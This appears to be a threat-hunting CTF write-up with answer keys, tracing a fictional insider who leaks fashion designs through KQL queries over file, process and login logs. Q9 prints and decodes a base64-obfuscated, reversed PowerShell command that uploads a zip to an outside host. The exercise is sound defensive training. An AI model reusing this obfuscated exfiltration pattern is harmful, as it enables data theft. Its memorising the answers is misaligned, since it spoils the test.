## Cowboy Couture: A Steampunk Space Adventure: Section 3: Cyber Cattle Thief<br>
### Summary
Well partner, it looks like you're ready to help us solve this cyber mystery! 🕵️‍♀️
<br><br>
Celestial Cowboy Couture has spent months planning and pouring money into launching their most anticipated collection. They even hired a superstar fashion CEO to take them to the next level and stand alongside the big French and Italian brands. Everything was set for the big launch, but just as they were ready to unveil the collection, an employee noticed something disturbing: some of their designs had already been knocked off and were available on OutlawBuy.com! 😱
<br><br>

**Q1. Enter Oh no to continue.**<br>

**Answer: Oh no**<br><br>

**Q2. Enter Saddle up to continue.**<br>

**Answer: Saddle up**<br><br>

**Q3. What is the name of the Lead Fashion Designer?**<br>

```
Employees
| where role == "Lead Fashion Designer"
```
<br>

**Answer: Megan Lucia**<br><br>

**Q4. Does it look like Megan was up to suspicious activity that needs to be investigated further? (Yes/No)**<br>

```
FileCreationEvents
| where hostname == "ITCK-MACHINE"
| order by timestamp desc
```
<br>

Browsing through the results, there are a number of entries with the folder titled 'designs_to_steal'.
<br><br>

```
C:\Users\melucia\Documents\designs_to_steal\2025_cowboy_vanity_fair_designs_SO_CHIC.zip
```
<br>

**Answer: Yes**<br><br>


**Q5. How many of these zip files were created on Megan's machine?**<br>

```
FileCreationEvents
| where hostname == "ITCK-MACHINE"
| where path contains ".zip"
| order by timestamp desc
```
<br>

**Answer: 4**<br><br>


**Q6. What folder were the zip files placed in on Megan's machine?**<br>
From previous query.<br><br>

**Answer: designs_to_steal**<br><br>

**Q7. An executable file, advanced-uploader.exe, appears on Megan’s machine after the creation of the zip files. What is the timestamp for when this file was created?**<br>

```
FileCreationEvents
| where hostname == "ITCK-MACHINE"
| where path contains "advanced-uploader.exe"
```
<br>

**Answer: 10/2/2024, 8:36:47 AM**<br><br>

**Q8. Was this process executed on Megan's machine?(Yes/No)**<br>

```
ProcessEvents
| where hostname == "ITCK-MACHINE"
| where process_name == "advanced-uploader.exe"
```
<br>
If a result is returned, then the process was executed on Megan's machine.<br><br>

**Answer: Yes**<br><br>


**Q9. What is the full URL where the files were exfiltrated to?**<br>
From previous query, the process commandline column.<br><br>

```
C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -Command "$enc = 'QzpcV2luZG93c1xTeXN0ZW0zMlxwb3dlcnNoZWxsLmV4ZSAtTm9wIC1FeGVjdXRpb25Qb2xpY3kgYnlwYXNzIC1Db21tYW5kICIkcmV2ID0gJzMgeXJ0ZXItLSBCTTUgZXppcy1rbnVoYy0tIHRweXJjbmUtLSBuaWhzdXB0aXRlZWthbnRyYXBlcmVodGFrb29sb3RuaWh0b250bmlhL21vYy55cnJlYmVsa2N1aC1ydW95LW1pLy86cHR0aCB0c2VkLS0gcGl6LnRvb2xfZGVvc3NhbFxjaWxidVBcc3Jlc1VcOkMgZWxpZi0tIGV4ZS5yZWRhb2xwdS1kZWNuYXZkYSc7JHJldls6Oi0xXSI=';[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($enc))"
```
<br>

Within the data above is a string can covert from Base 64.<br><br>

Base 64.<br><br>

```
QzpcV2luZG93c1xTeXN0ZW0zMlxwb3dlcnNoZWxsLmV4ZSAtTm9wIC1FeGVjdXRpb25Qb2xpY3kgYnlwYXNzIC1Db21tYW5kICIkcmV2ID0gJzMgeXJ0ZXItLSBCTTUgZXppcy1rbnVoYy0tIHRweXJjbmUtLSBuaWhzdXB0aXRlZWthbnRyYXBlcmVodGFrb29sb3RuaWh0b250bmlhL21vYy55cnJlYmVsa2N1aC1ydW95LW1pLy86cHR0aCB0c2VkLS0gcGl6LnRvb2xfZGVvc3NhbFxjaWxidVBcc3Jlc1VcOkMgZWxpZi0tIGV4ZS5yZWRhb2xwdS1kZWNuYXZkYSc7JHJldls6Oi0xXSI=
```
<br>

Using Cyberchef, convert it from Base 64.<br><br>

```
C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -Command "$rev = '3 yrter-- BM5 ezis-knuhc-- tpyrcne-- nihsuptiteekantraperehtakoolotnihtontnia/moc.yrrebelkcuh-ruoy-mi//:ptth tsed-- piz.tool_deossal\cilbuP\sresU\:C elif-- exe.redaolpu-decnavda';$rev[::-1]"
```
<br>

Appears the output is in reverse. Can reverse the output in Cyberchef.<br><br>

```
]1-::[ver$;'advanced-uploader.exe --file C:\Users\Public\lassoed_loot.zip --dest http://im-your-huckleberry.com/aintnothintolookatherepartnakeetitpushin --encrypt --chunk-size 5MB --retry 3' = ver$
```
<br>



**Answer: http://im-your-huckleberry.com/aintnothintolookatherepartnakeetitpushin**<br><br>

**Q10. What database table contains evidence of employee logins?**<br>

**Answer: AuthenticationEvents**<br><br>

**Q11. Paste the timestamp for when that anomalous login occurred.**<br>

```
AuthenticationEvents
| where username == "melucia"
|where result == "Successful Login"
```
<br>

The source IP address and user agent are different from the other results.<br><br>

**Answer: 9/23/2024, 6:58:54 AM**<br><br>

**Q12. What is the source IP used for that login?**<br>
From previous query.<br><br>

**Answer: 192.124.249.15**<br><br>
